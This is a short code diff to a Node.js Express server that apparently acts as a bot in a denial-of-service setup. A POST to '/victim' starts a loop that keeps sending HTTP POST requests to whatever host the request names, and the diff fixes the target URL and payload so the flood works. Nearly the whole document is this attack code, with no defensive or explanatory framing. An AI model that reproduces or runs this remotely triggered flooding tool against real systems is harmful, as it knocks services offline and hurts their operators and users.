@@ -160,6 +160,7 @@ app.post("/election", function(req, res) {
 
 app.post("/victim", function(req, res) {
 	console.log("attacking...");
+	console.log(req.body.victim);
 	attack = true;
 	while (attack) {
 		attackVictim(req.body.victim);
@@ -173,11 +174,13 @@ app.delete("/victim", function(req, res) {
 });
 
 function attackVictim(victim) {
+	console.log("http://" + victim + "/attacker");
 	request.post({
 	  headers: {"content-type" : "application/json"},
-	  url:     victim + "/",
-	  body:    "{}"
+	  url:     "http://" + victim + "/",
+	  body:    JSON.stringify({"x":"D"})
 	}, function(error, res, body){
+		console.log(error);
 	});
 }
 
